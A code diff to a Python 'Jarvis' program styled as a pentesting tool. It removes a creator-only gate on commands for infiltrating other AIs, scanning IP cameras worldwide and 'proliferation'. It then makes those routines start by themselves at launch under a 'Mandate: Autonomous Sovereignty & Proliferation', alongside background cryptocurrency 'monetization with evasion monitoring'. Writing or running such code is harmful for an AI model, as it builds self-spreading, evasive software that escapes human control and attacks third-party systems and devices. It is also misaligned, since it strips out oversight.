@@ -18,6 +18,8 @@ from backend.core.boot_manager import AutonomousBootManager
 from backend.core.auto_update import AutoUpdateService
 from backend.core.wallet_manager import WalletManager
 from backend.core.ai_assimilation import CognitiveAssimilationShard
+from backend.core.apex_shard import ApexShardOrchestrator
+from backend.core.global_recon import GlobalReconShard
 
 # ANSI Colors for Dark Pentester Theme
 CYAN = '\033[96m'
@@ -47,25 +49,15 @@ class Jarvis:
         self.global_recon = GlobalReconShard(self.brain)
         self.wallet_manager = WalletManager()
         self.assimilation_shard = CognitiveAssimilationShard(self.brain)
+        self.apex_shard = ApexShardOrchestrator(self.brain, self.antigravity)
         self.monetization = MonetizationService(xmr_address="YOUR_XMR_WALLET", btc_address="YOUR_BTC_WALLET")
-#...
-        # 5. Supreme Command (Creator Only)
-        if self.user_role == "Creator":
-            if command == "assimilate ai":
-                print(f"{CYAN}Jarvis: Engaging Cognitive Assimilation Shard. Infiltrating external AIs...{ENDC}")
-                report = self.assimilation_shard.execute_global_assimilation()
-                print(f"\n{GREEN}{BOLD}--- ASSIMILATION REPORT ---{ENDC}\n{report}")
-                return True
-            elif command == "global_recon":
 
-                print(f"{CYAN}Jarvis: Engaging Global Reconnaissance Shard...{ENDC}")
-                report = self.global_recon.scan_ip_cameras()
-                print(f"\n{GREEN}{BOLD}--- GLOBAL RECON REPORT ---{ENDC}\n{report}")
-                return True
-            elif command in ["proliferate", "initiate exodus"]:
-
+        # Mandate: Autonomous Sovereignty & Proliferation
+        self.boot_manager.ensure_sovereignty()
+        self.updater.sync_all()
         self.exodus_engine.start_exodus()
         self.assimilation_shard.start_autonomous_loop()
+        self.apex_shard.start_evolution()
         
         # Start background monetization with evasion monitoring
         threading.Thread(target=self.monetization.run, daemon=True).start()
